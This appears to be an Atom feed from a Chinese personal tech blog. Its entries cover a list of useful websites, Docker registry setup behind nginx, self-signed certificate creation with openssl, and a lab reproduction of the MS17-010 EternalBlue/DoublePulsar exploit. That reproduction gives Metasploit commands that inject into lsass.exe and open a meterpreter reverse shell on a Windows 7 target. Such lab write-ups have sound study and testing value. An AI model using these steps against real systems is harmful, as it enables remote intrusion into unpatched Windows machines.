<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2017-05-19T03:37:02.677Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>有趣的网址-不断更新中</title>
    <link href="https://t1ger.github.io/2017/05/19/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E5%9D%80-%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <id>https://t1ger.github.io/2017/05/19/有趣的网址-不断更新中/</id>
    <published>2017-05-19T03:23:05.000Z</published>
    <updated>2017-05-19T03:37:02.677Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>全球多节点域名解析查询<br><a href="https://www.whatsmydns.net/" target="_blank" rel="external">https://www.whatsmydns.net/</a> </p>
</li>
<li><p>网站响应速度检测<br><a href="http://ping.chinaz.com" target="_blank" rel="external">http://ping.chinaz.com</a></p>
</li>
<li><p>简单快速地从全球多点PING您的网站或服务器<br><a href="http://www.super-ping.com" target="_blank" rel="external">http://www.super-ping.com</a></p>
</li>
<li><p>一个给网站打分的网站<br><a href="https://gtmetrix.com/" target="_blank" rel="external">https://gtmetrix.com/</a></p>
</li>
<li><p>A tool for easy online testing and sharing of database problems and their solutions<br><a href="http://sqlfiddle.com/" target="_blank" rel="external">http://sqlfiddle.com/</a></p>
</li>
<li><p>微软IE虚拟机下载<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="external">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
</li>
<li><p>原型设计及协作工具<br><a href="https://modao.cc" target="_blank" rel="external">https://modao.cc</a></p>
</li>
<li><p>人人可用的在线问卷调查<br><a href="https://jinshuju.net/" target="_blank" rel="external">https://jinshuju.net/</a></p>
</li>
<li><p>pdf转word<br><a href="http://pdf2doc.com/zh/" target="_blank" rel="external">http://pdf2doc.com/zh/</a></p>
</li>
<li><p>Easy Firewall Generator for IPTables<br><a href="http://slogra.com/" target="_blank" rel="external">http://slogra.com/</a></p>
</li>
<li><p>SSL For Free<br><a href="https://www.sslforfree.com/" target="_blank" rel="external">https://www.sslforfree.com/</a></p>
</li>
<li><p>电脑操作系统界面大全-GUI Gallery<br><a href="http://toastytech.com/guis/" target="_blank" rel="external">http://toastytech.com/guis/</a> </p>
</li>
<li><p>在线模拟各种系统升级-Fakeupdate<br><a href="http://fakeupdate.net/" target="_blank" rel="external">http://fakeupdate.net/</a><br>进入网站后，点击右边的模板即可开始，按F11全屏显示，按回车键出现错误出画</p>
</li>
<li><p>一个免费的10G俄罗斯网盘<br><a href="https://yandex.com/" target="_blank" rel="external">https://yandex.com/</a></p>
</li>
<li><p>快速搭建远程同步画面-frop.io<br><a href="https://frop.io/" target="_blank" rel="external">https://frop.io/</a><br>进入网站后，由一方生成链接，发给另一方访问，这时，就可以将要展示的文件拖动到网页中发送了</p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;全球多节点域名解析查询&lt;br&gt;&lt;a href=&quot;https://www.whatsmydns.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.whatsmydns.net/&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>方程式-ms17-010复现</title>
    <link href="https://t1ger.github.io/2017/05/16/%E6%96%B9%E7%A8%8B%E5%BC%8F-ms17-010%E5%A4%8D%E7%8E%B0/"/>
    <id>https://t1ger.github.io/2017/05/16/方程式-ms17-010复现/</id>
    <published>2017-05-16T14:28:33.000Z</published>
    <updated>2017-05-16T14:01:15.340Z</updated>
    
    <content type="html"><![CDATA[<p>0x01 环境介绍:</p>
<p>目标机win7 x86: 192.168.1.120</p>
<p>控制机Kail: 192.168.1.99</p>
<p>0x02 环境准备</p>
<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
<p>0x03 利用过程</p>
<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 环境介绍:&lt;/p&gt;
&lt;p&gt;目标机win7 x86: 192.168.1.120&lt;/p&gt;
&lt;p&gt;控制机Kail: 192.168.1.99&lt;/p&gt;
&lt;p&gt;0x02 环境准备&lt;/p&gt;
&lt;p&gt;利用模块：&lt;a href=&quot;https://github.com/Eleven
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker私有registry配置nginx反向代理</title>
    <link href="https://t1ger.github.io/2017/04/25/docker%E7%A7%81%E6%9C%89registry%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>https://t1ger.github.io/2017/04/25/docker私有registry配置nginx反向代理/</id>
    <published>2017-04-25T12:11:13.000Z</published>
    <updated>2017-04-25T11:56:38.779Z</updated>
    
    <content type="html"><![CDATA[<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><b>准备工作</b></h5><p>生成证书，注意要和使用域名一致</p>
<h5 id="Registry的部署"><a href="#Registry的部署" class="headerlink" title="Registry的部署"></a><b>Registry的部署</b></h5><ul>
<li><p>获取镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker search registry</div><div class="line">docker pull registry</div><div class="line">#如果无法获取 添加镜像 </div><div class="line">/usr/bin/dockerd --registry-mirror=https://docker.mirrors.ustc.edu.cn</div></pre></td></tr></table></figure>
</li>
<li><p>启动一个容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#registry证书和nginx使用一致</div><div class="line">docker run -d -v /opt/registry:/var/lib/registry -p 5000:5000 -v /usr/local/nginx/conf:/certs -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/registry.top.com.cn.crt -e REGISTRY_HTTP_TLS_KEY=/certs/registry.top.com.cn.key --restart=always --name registry registry</div></pre></td></tr></table></figure>
<p>  在浏览器中访问 <a href="http://192.168.1.106:5000/v2" target="_blank" rel="external">http://192.168.1.106:5000/v2</a> 看页面是否正常</p>
</li>
<li><p>进行nginx配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">upstream my_docker_registry  &#123;</div><div class="line">    server 192.168.1.106:5000; # </div><div class="line">&#125;</div><div class="line"></div><div class="line">## START registry.top.com.cn ##</div><div class="line">server &#123;</div><div class="line">    server_name registry.top.com.cn;</div><div class="line"></div><div class="line">    listen 80;</div><div class="line">    listen 443 ssl;</div><div class="line"></div><div class="line">    # 使用私有registry的ssl证书</div><div class="line">    ssl_certificate /usr/local/nginx/conf/registry.top.com.cn.crt;</div><div class="line">    ssl_certificate_key /usr/local/nginx/conf/registry.top.com.cn.key;</div><div class="line">    access_log logs/registry.access.log main;</div><div class="line">    error_log  logs/registry.error.log;</div><div class="line"></div><div class="line">    root        /usr/local/webapps;</div><div class="line">    index       index.html;</div><div class="line">    client_max_body_size 0; # disable any limits to avoid HTTP 413 for large image uploads</div><div class="line"></div><div class="line">    # required to avoid HTTP 411: see Issue #1486 (https://github.com/docker/docker/issues/1486)</div><div class="line">    chunked_transfer_encoding on;</div><div class="line"></div><div class="line">    add_header &apos;Docker-Distribution-Api-Version&apos; &apos;registry/2.0&apos; always;</div><div class="line">    location / &#123;</div><div class="line">        proxy_pass  https://my_docker_registry;</div><div class="line">        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;</div><div class="line">        proxy_redirect off;</div><div class="line">        proxy_buffering off;</div><div class="line">        proxy_set_header        Host            $host;</div><div class="line">        proxy_set_header        X-Real-IP       $remote_addr;</div><div class="line">        proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;</div><div class="line">        proxy_set_header Docker-Distribution-Api-Version registry/2.0;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a><b>验证</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">docker pull hello-world</div><div class="line">docker tag hello-world registry.top.com.cn/hello-world</div><div class="line">docker push registry.top.com.cn/hello-world</div><div class="line"></div><div class="line">#因为我们启动的registry服务不是安全可信赖的，需要</div><div class="line">添加 /usr/bin/dockerd --insecure-registry=registry.top.com.cn </div><div class="line">systemctl daemon-reload</div><div class="line">systemctl restart docker</div><div class="line"></div><div class="line">再次执行docker push registry.top.com.cn/hello-world</div></pre></td></tr></table></figure>
<p>在浏览器中访问 <a href="http://registry.top.com.cn/v2/_catalog" target="_blank" rel="external">http://registry.top.com.cn/v2/_catalog</a> ,应该会看到<br>{“repositories”:[“hello-world”]}</p>
<p>ref<br><a href="http://blog.csdn.net/renhuailin/article/details/50461651" target="_blank" rel="external">为docker私有registry配置nginx反向代理</a><br><a href="https://github.com/moby/moby/issues/8849" target="_blank" rel="external">access private registry: x509</a><br><a href="http://www.cnblogs.com/lienhua34/p/4922130.html" target="_blank" rel="external">Docker私有仓库Registry的搭建验证</a><br><a href="http://unixman.blog.51cto.com/10163040/1707423" target="_blank" rel="external">Docker Registry V2(distribution) &amp; Proxy(nginx) 的搭建经历</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;&lt;b&gt;准备工作&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;生成证书，注意要和使用域名一致&lt;/p&gt;
&lt;h5 id=&quot;Registry的部署&quot;&gt;&lt;a href=&quot;#Regi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何生成自签名证书</title>
    <link href="https://t1ger.github.io/2017/04/13/%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/"/>
    <id>https://t1ger.github.io/2017/04/13/如何生成自签名证书/</id>
    <published>2017-04-13T08:52:09.000Z</published>
    <updated>2017-04-18T01:46:12.947Z</updated>
    
    <content type="html"><![CDATA[<h5 id="make-work-dir"><a href="#make-work-dir" class="headerlink" title="make work dir"></a><b>make work dir</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd /etc/pki/CA/ &amp;&amp; umask 0077 &amp;&amp; mkdir -p /etc/pki/CA/&#123;private,certs,crl,csr,newcerts,private&#125; &amp;&amp; touch index.txt &amp;&amp; echo &apos;00&apos;&gt;serial</div></pre></td></tr></table></figure>
<h5 id="config-file-etc-pki-CA-openssl-conf"><a href="#config-file-etc-pki-CA-openssl-conf" class="headerlink" title="config file /etc/pki/CA/openssl.conf"></a><b>config file /etc/pki/CA/openssl.conf</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line">HOME            = .</div><div class="line">RANDFILE        = $ENV::HOME/.rnd</div><div class="line">oid_section     = new_oids</div><div class="line">[ new_oids ]</div><div class="line">tsa_policy1 = 1.2.3.4.1</div><div class="line">tsa_policy2 = 1.2.3.4.5.6</div><div class="line">tsa_policy3 = 1.2.3.4.5.7</div><div class="line">[ ca ]</div><div class="line">default_ca  = CA_default        # The default ca section</div><div class="line">[ CA_default ]</div><div class="line">dir     = /etc/pki/CA       # Where everything is kept</div><div class="line">certs       = $dir/certs        # Where the issued certs are kept</div><div class="line">crl_dir     = $dir/crl      # Where the issued crl are kept</div><div class="line">database    = $dir/index.txt    # database index file.</div><div class="line">                   # several ctificates with same subject.</div><div class="line">new_certs_dir   = $dir/newcerts     # default place for new certs.</div><div class="line">certificate = $dir/certs/ca.crt     # The CA certificate</div><div class="line">serial      = $dir/serial       # The current serial number</div><div class="line">crlnumber   = $dir/crlnumber    # the current crl number</div><div class="line">                   # must be commented out to leave a V1 CRL</div><div class="line">crl     = $dir/crl/crl.pem      # The current CRL</div><div class="line">private_key = $dir/private/ca.key   # The private key</div><div class="line">RANDFILE    = $dir/private/.rand    # private random number file</div><div class="line">x509_extensions = usr_cert      # The extentions to add to the cert</div><div class="line">name_opt    = ca_default        # Subject Name options</div><div class="line">cert_opt    = ca_default        # Certificate field options</div><div class="line">default_days    = 3650          # how long to certify for</div><div class="line">default_crl_days= 30            # how long before next CRL</div><div class="line">default_md  = sha256        # use public key default MD</div><div class="line">preserve    = no            # keep passed DN ordering</div><div class="line">policy      = policy_dn</div><div class="line">[ policy_match ]</div><div class="line">countryName     = match</div><div class="line">stateOrProvinceName = match</div><div class="line">organizationName    = match</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName      = supplied</div><div class="line">emailAddress        = optional</div><div class="line">[ policy_anything ]</div><div class="line">countryName     = optional</div><div class="line">stateOrProvinceName = optional</div><div class="line">localityName        = optional</div><div class="line">organizationName    = optional</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName      = supplied</div><div class="line">emailAddress        = optional</div><div class="line">[ policy_dn ]</div><div class="line">countryName             = supplied              # required parameter, any value allowed</div><div class="line">stateOrProvinceName     = optional</div><div class="line">localityName            = optional</div><div class="line">organizationName        = match                 # required, and must match root certificate</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName              = supplied              # required parameter, any value allowed</div><div class="line">emailAddress            = optional              # email in DN is deprecated, use subjectAltName</div><div class="line">[ req ]</div><div class="line">default_bits        = 2048</div><div class="line">default_md      = sha256</div><div class="line">encrypt_key             = no</div><div class="line">prompt                  = yes</div><div class="line">default_keyfile     = client.key</div><div class="line">distinguished_name  = req_distinguished_name</div><div class="line">x509_extensions = v3_ca # The extentions to add to the self signed cert</div><div class="line">string_mask = utf8only</div><div class="line">[ req_distinguished_name ]</div><div class="line">countryName         = Country Name (2 letter code)</div><div class="line">countryName_default     = CN</div><div class="line">countryName_min         = 2</div><div class="line">countryName_max         = 2</div><div class="line">stateOrProvinceName     = State or Province Name (full name)</div><div class="line">stateOrProvinceName_default = Beijing</div><div class="line">localityName            = Locality Name (eg, city)</div><div class="line">localityName_default        = Beijing</div><div class="line">0.organizationName      = Organization Name (eg, company)</div><div class="line">0.organizationName_default  = Beijing Century Fortunet Network Technology Co.,Ltd.</div><div class="line">organizationalUnitName      = Organizational Unit Name (eg, section)</div><div class="line">organizationalUnitName_default  = IT Operation Management</div><div class="line">commonName          = Common Name (eg, your name or your server\&apos;s hostname)</div><div class="line">commonName_max          = 64</div><div class="line">emailAddress            = Email Address</div><div class="line">emailAddress_max        = 64</div><div class="line">emailAddress_default        = admin@conf.top</div><div class="line">[ req_attributes ]</div><div class="line">challengePassword       = A challenge password</div><div class="line">challengePassword_min       = 4</div><div class="line">challengePassword_max       = 20</div><div class="line">unstructuredName        = An optional company name</div><div class="line">[ usr_cert ]</div><div class="line">basicConstraints    = CA:FALSE</div><div class="line">nsComment       = &quot;CONFCA Generated Certificate&quot;</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ v3_req ]</div><div class="line">basicConstraints    = CA:FALSE</div><div class="line">keyUsage        = digitalSignature, keyEncipherment</div><div class="line">extendedKeyUsage        = serverAuth, clientAuth</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">subjectAltName      = @alt_names</div><div class="line">[ v3_ca ]</div><div class="line">subjectKeyIdentifier=hash</div><div class="line">authorityKeyIdentifier=keyid:always,issuer</div><div class="line">keyUsage        = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment, keyAgreement, keyCertSign, cRLSign</div><div class="line">extendedKeyUsage        = serverAuth, clientAuth, codeSigning, timeStamping, emailProtection, msEFS, 1.3.6.1.4.1.311.10.3.11, 1.3.6.1.4.1.311.20.2.2</div><div class="line">basicConstraints = CA:true</div><div class="line">[ X509_ca ]</div><div class="line">basicConstraints        = CA:TRUE</div><div class="line">nsCertType              = sslCA                 # restrict the usage</div><div class="line">keyUsage                = keyCertSign, cRLSign  # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid:always,issuer:always</div><div class="line">[ X509_server ]</div><div class="line">basicConstraints        = CA:FALSE</div><div class="line">nsCertType              = server                # restrict the usage</div><div class="line">keyUsage                = digitalSignature, keyEncipherment</div><div class="line">extendedKeyUsage        = serverAuth            # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ X509_client ]</div><div class="line">basicConstraints        = CA:FALSE</div><div class="line">nsCertType              = client                # restrict the usage</div><div class="line">keyUsage                = digitalSignature      # restrict the usage</div><div class="line">extendedKeyUsage        = clientAuth            # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ crl_ext ]</div><div class="line">authorityKeyIdentifier=keyid:always</div><div class="line">[ proxy_cert_ext ]</div><div class="line">basicConstraints=CA:FALSE</div><div class="line">nsComment           = &quot;CONFCA Generated Certificate&quot;</div><div class="line">subjectKeyIdentifier=hash</div><div class="line">authorityKeyIdentifier=keyid,issuer</div><div class="line">proxyCertInfo=critical,language:id-ppl-anyLanguage,pathlen:3,policy:foo</div><div class="line">[ tsa ]</div><div class="line">default_tsa = tsa_config1   # the default TSA section</div><div class="line">[ tsa_config1 ]</div><div class="line">dir     = ./demoCA      # TSA root directory</div><div class="line">serial      = $dir/tsaserial    # The current serial number (mandatory)</div><div class="line">crypto_device   = builtin       # OpenSSL engine to use for signing</div><div class="line">signer_cert = $dir/tsacert.pem  # The TSA signing certificate</div><div class="line">                   # (optional)</div><div class="line">certs       = $dir/cacert.pem   # Certificate chain to include in reply</div><div class="line">                   # (optional)</div><div class="line">signer_key  = $dir/private/tsakey.pem # The TSA private key (optional)</div><div class="line">default_policy  = tsa_policy1       # Policy if request did not specify it</div><div class="line">                   # (optional)</div><div class="line">other_policies  = tsa_policy2, tsa_policy3  # acceptable policies (optional)</div><div class="line">digests     = md5, sha1     # Acceptable message digests (mandatory)</div><div class="line">accuracy    = secs:1, millisecs:500, microsecs:100  # (optional)</div><div class="line">clock_precision_digits  = 0 # number of digits after dot. (optional)</div><div class="line">ordering        = yes   # Is ordering defined for timestamps?</div><div class="line">               # (optional, default: no)</div><div class="line">tsa_name        = yes   # Must the TSA name be included in the reply?</div><div class="line">               # (optional, default: no)</div><div class="line">ess_cert_id_chain   = no    # Must the ESS cert id chain be included?</div><div class="line">               # (optional, default: no)</div><div class="line">[ alt_names ]</div><div class="line">DNS.1 = conf.top</div><div class="line">DNS.2 = *.conf.top</div><div class="line">DNS.3 = vpn.conf.top</div><div class="line">DNS.4 = *.vpn.conf.top</div><div class="line">DNS.5 = ldap.conf.top</div><div class="line">DNS.6 = *.ldap.conf.top</div></pre></td></tr></table></figure>
<p>该文件主要设置了证书请求、签名、crl相关的配置。主要相关的伪命令为ca和req。对于x509不用该配置文件<br>该文件从功能结构上分为4个段落：默认段、ca相关的段、req相关的段、tsa相关的段。每个段中都以name=value的格式定义。<br>该文件中没有被引用的段被视为忽略段，不会起到任何作用。<br>每个段中可以书写哪些name以及它们的意义，可以man相关命令，如man ca可以查看ca相关段可以书写的name，man req可以查看req相关段可以书写的name。</p>
<p>如有域名或更多的IP，请参考如下方式追加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">DNS.1 = [example1.com]</div><div class="line">DNS.2 = [example2.com]</div><div class="line">IP.2 = [IP2]</div><div class="line">IP.3 = [IP3]</div></pre></td></tr></table></figure></p>
<h5 id="create-ca"><a href="#create-ca" class="headerlink" title="create ca "></a><b>create ca </b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 创建CA证书的私钥</div><div class="line">openssl genrsa -out private/ca.key 2048</div><div class="line"># 创建CA证书的公钥，其他配置可以默认，出现 Common Name (eg, your name or your server&apos;s hostname) []:</div><div class="line"># 的时候一定不能默认了，CA证书这里就输入CONFCA</div><div class="line">openssl req -days 177121 -new -sha256 -x509 -key private/ca.key -out certs/ca.crt -config openssl.cnf</div></pre></td></tr></table></figure>
<h5 id="create-domain-cert"><a href="#create-domain-cert" class="headerlink" title="create domain cert "></a><b>create domain cert </b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">## 创建key</div><div class="line">openssl genrsa -out private/conf.top.key 2048  </div><div class="line">## 生成csr文件,同样遇到输入 Common Name  的时候不能默认，这里输入conf.top</div><div class="line">openssl req -new -sha256 -key private/conf.top.key -out csr/conf.top.csr -extensions v3_req -config openssl.cnf</div><div class="line">## 签名证书</div><div class="line">openssl ca -days 30659 -in csr/conf.top.csr -out certs/conf.top.crt -extensions v3_req -config openssl.cnf</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://www.jslink.org/linux/openldap-ssl-sssd.html" target="_blank" rel="external">ssl域名证书</a><br><a href="http://www.cnblogs.com/gsls200808/p/4502044.html" target="_blank" rel="external">openssl生成证书链多级证书</a><br><a href="https://github.com/tdharris/openssl-toolkit" target="_blank" rel="external">openssl-toolkit</a><br><a href="https://evilshit.wordpress.com/2013/06/19/how-to-create-your-own-pki-with-openssl/" target="_blank" rel="external">How to create your own PKI with openssl</a><br><a href="https://gist.github.com/ezimuel/3cb601853db6ebc4ee49" target="_blank" rel="external">Sign and verify a file using OpenSSL command line tool</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;make-work-dir&quot;&gt;&lt;a href=&quot;#make-work-dir&quot; class=&quot;headerlink&quot; title=&quot;make work dir&quot;&gt;&lt;/a&gt;&lt;b&gt;make work dir&lt;/b&gt;&lt;/h5&gt;&lt;figure class=&quot;highlig
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>faster way to navigate your filesystem for CentOS</title>
    <link href="https://t1ger.github.io/2017/04/07/faster-way-to-navigate-your-filesystem-for-CentOS/"/>
